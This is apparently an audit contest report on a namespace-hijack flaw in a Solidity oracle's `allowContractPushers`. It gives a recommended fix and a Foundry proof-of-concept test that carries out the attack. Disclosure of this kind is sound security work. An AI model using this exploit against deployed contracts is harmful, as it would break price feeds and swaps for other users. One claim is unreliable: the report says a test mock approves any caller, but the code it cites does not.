### Title
Contract-Pusher Namespace Hijack via Unchecked Overwrite in `allowContractPushers` — (File: `smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowContractPushers` in `CompressedOracleV1` does not check whether a pusher contract is already mapped to a different creator. Any caller for whom `pusherContract.isPusher(caller)` returns `true` can silently overwrite an existing `namespaceRemapping` entry, redirecting all future price pushes away from the legitimate creator's namespace. The displaced creator loses the ability to remove the pusher (because `removePushers` enforces `namespaceRemapping[pusher] == msg.sender`), and pools anchored to the legitimate creator's feeds receive stale prices, causing `AnchoredPriceProvider.getBidAndAskPrice()` to revert with `FeedStalled` on every swap.

---

### Finding Description

`CompressedOracleV1` maintains a single `mapping(address => address) public namespaceRemapping` that routes a pusher's `fallback()` writes into a creator's namespace. [1](#0-0) 

The `allowContractPushers` path proves consent via a live `isPusher(msg.sender)` staticcall and then unconditionally overwrites the mapping: [2](#0-1) 

There is no guard of the form `require(namespaceRemapping[pusher] == address(0) || namespaceRemapping[pusher] == msg.sender)`. Any address for which the pusher contract returns `isPusher == true` can call `allowContractPushers` at any time and atomically redirect the pusher to their own namespace.

Contrast this with the EOA path (`allowPushers`), where the signed message explicitly binds the pusher's consent to a specific creator (`msg.sender`) and a deadline, making the same overwrite impossible: [3](#0-2) 

The `fallback()` push path resolves the destination namespace at call time from `namespaceRemapping[msg.sender]`: [4](#0-3) 

Once the mapping is overwritten, the legitimate creator's slots stop receiving updates. The displaced creator cannot call `removePushers` to recover because that function enforces `namespaceRemapping[pusher] == msg.sender` and reverts `InvalidManager` otherwise: [5](#0-4) 

---

### Impact Explanation

Pools that use `AnchoredPriceProvider` with a `baseFeedId` derived from the legitimate creator's namespace (`feedIdOf(creatorA, slot, pos)`) will read a stale timestamp once the pusher stops writing to that namespace. `_readLeg` applies `_isStale` against `MAX_REF_STALENESS`: [6](#0-5) 

A stale result causes `_getBidAndAskPrice` to return `(0, type(uint128).max)`, and `getBidAndAskPrice` reverts with `FeedStalled`: [7](#0-6) 

Every swap through the affected pool fails. This is broken core pool functionality — an unusable swap flow — which is a contest-relevant impact.

---

### Likelihood Explanation

The attack is executable by any address for which the target pusher contract's `isPusher` returns `true`. Pusher contracts that serve multiple creators (e.g., a shared oracle relay service) or that implement a permissive `isPusher` (returning `true` for any caller) are directly exploitable. The protocol's own test suite demonstrates a `MockPusherAllowed` that returns `true` unconditionally, confirming this is a realistic deployment pattern: [8](#0-7) 

The attack requires no privileged role, no special token, and no prior state — only a single `allowContractPushers` call. It can be repeated to persistently block the legitimate creator from re-establishing the mapping (front-run every recovery attempt). The displaced creator has no on-chain recourse once the mapping is overwritten.

---

### Recommendation

Add an existence check before overwriting `namespaceRemapping`:

```solidity
function allowContractPushers(address[] calldata pushers) external {
    uint256 l = pushers.length;
    for (uint256 i; i < l; i++) {
        address pusher = pushers[i];
        if (pusher == msg.sender) revert NoSelfRemapping();

        // NEW: prevent silent hijack of an existing delegation
        address current = namespaceRemapping[pusher];
        if (current != address(0) && current != msg.sender) {
            revert AlreadyDelegated(pusher, current);
        }

        (bool ok, bytes memory res) = pusher.staticcall(
            abi.encodeWithSignature("isPusher(address)", msg.sender)
        );
        require(ok);
        bool allowed = abi.decode(res, (bool));
        require(allowed);

        namespaceRemapping[pusher] = msg.sender;
        emit PusherAuthorized(pusher, msg.sender);
    }
}
```

This mirrors the protection already present in `allowPushers` (where the signature binds consent to a specific creator) and prevents any third party from silently redirecting an active pusher.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {CompressedOracleV1} from "contracts/oracles/compressed/CompressedOracle.sol";
import {IOffchainOracle} from "contracts/interfaces/IOffchainOracle.sol";
import {U64x32} from "contracts/oracles/utils/U64x32.sol";

/// Permissive pusher: isPusher returns true for ANY caller.
contract PermissivePusher {
    function isPusher(address) external pure returns (bool) { return true; }
}

contract NamespaceHijackPoC is Test {
    CompressedOracleV1 oracle;
    PermissivePusher pusher;

    address creatorA = address(0xAAAA);
    address attacker = address(0xBEEF);

    function setUp() public {
        oracle = new CompressedOracleV1(address(this), 0);
        pusher = new PermissivePusher();
        vm.warp(1_700_000_000);
    }

    function testHijack() public {
        // 1. creatorA legitimately delegates the pusher.
        address[] memory p = new address[](1);
        p[0] = address(pusher);
        vm.prank(creatorA);
        oracle.allowContractPushers(p);
        assertEq(oracle.namespaceRemapping(address(pusher)), creatorA);

        // 2. Attacker overwrites the mapping — no signature, no privilege needed.
        vm.prank(attacker);
        oracle.allowContractPushers(p);
        assertEq(oracle.namespaceRemapping(address(pusher)), attacker); // hijacked

        // 3. Pusher's next push lands in ATTACKER's namespace, not creatorA's.
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint256 word = (uint256(tsMs) << 8) | uint256(5); // slotId = 5
        uint48 raw = (uint48(1_000_000) << 16) | (uint48(4) << 8) | uint48(2);
        word |= uint256(raw) << 208;
        vm.prank(address(pusher));
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // creatorA's feed is empty (stale → pool FeedStalled).
        IOffchainOracle.OracleData memory dataA =
            oracle.getOracleData(oracle.feedIdOf(creatorA, 5, 0));
        assertEq(dataA.price, 0, "creatorA feed starved");

        // 4. creatorA cannot remove the pusher — InvalidManager.
        vm.prank(creatorA);
        vm.expectRevert();
        oracle.removePushers(p);
    }
}
```

The test demonstrates that a single unprivileged `allowContractPushers` call by the attacker silently redirects all future price pushes away from `creatorA`'s namespace, starving any pool anchored to `feedIdOf(creatorA, ...)` and making it permanently unusable until the pusher self-revokes and creatorA races to re-establish the mapping faster than the attacker can front-run it.

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L29-29)
```text
    mapping(address => address) public namespaceRemapping;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-210)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L217-233)
```text
    function allowContractPushers(address[] calldata pushers) external {
        uint256 l = pushers.length;
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            (bool ok, bytes memory res) = pusher.staticcall(abi.encodeWithSignature("isPusher(address)", msg.sender));
            require(ok);
            bool allowed = abi.decode(res, (bool));
            require(allowed);

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L253-258)
```text
            if (namespaceRemapping[pusher] == msg.sender) {
                namespaceRemapping[pusher] = address(0);
                emit PusherRevoked(pusher, msg.sender);
            } else {
                revert InvalidManager(msg.sender);
            }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L214-217)
```text
    function getBidAndAskPrice() external override returns (uint128 bid, uint128 ask) {
        (bid, ask) = _getBidAndAskPrice();
        if (bid == 0 || ask == type(uint128).max) revert FeedStalled();
    }
```

**File:** smart-contracts-poc/contracts/AnchoredPriceProvider.sol (L282-283)
```text
        // Stale reference → not ok. Clamping to a stale anchor is the one false-safety case.
        if (_isStale(refTime, block.timestamp, MAX_REF_STALENESS)) return (mid, spreadBps, refTime, false);
```

**File:** smart-contracts-poc/test/oracles/compressed/CompressedOracleContractPushers.t.sol (L31-34)
```text

    function isPusher(address caller) external view returns (bool) {
        return caller == allowedCreator;
    }
```
